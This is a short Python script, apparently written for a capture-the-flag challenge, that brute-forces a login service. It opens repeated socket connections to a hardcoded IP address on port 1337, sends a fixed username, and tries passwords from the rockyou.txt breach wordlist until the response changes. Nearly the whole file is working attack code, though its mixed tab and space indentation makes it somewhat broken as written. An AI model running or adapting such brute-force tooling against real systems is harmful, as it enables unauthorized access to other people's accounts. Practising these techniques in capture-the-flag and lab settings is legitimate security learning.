import socket

host = "142.93.136.81" # IP address here
port = 1337 # Port here
wordlist = "./rockyou.txt" # Point to wordlist file

f = open(wordlist, "r")

def brute_force():

    username = "v0idcashe\n"   # Hint: use OSINT
    password = "password\n"   # Hint: use wordlist

    data = ""
    line = 0
    while "c" not in data:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    	s.connect((host, port))

    	password = f.readline()
	line=line+1
	data=s.recv(1024)
	s.send(username)
	data = s.recv(1024)
    	s.send(password)
        count=0
    	while "Fail" not in data and count < 4:
        	print(data)
		data=s.recv(1024)
		count = count+1
		if count%1 == 0:
			print(password+" "+str(line))
	data=s.recv(1024)

if __name__ == '__main__':
    brute_force()
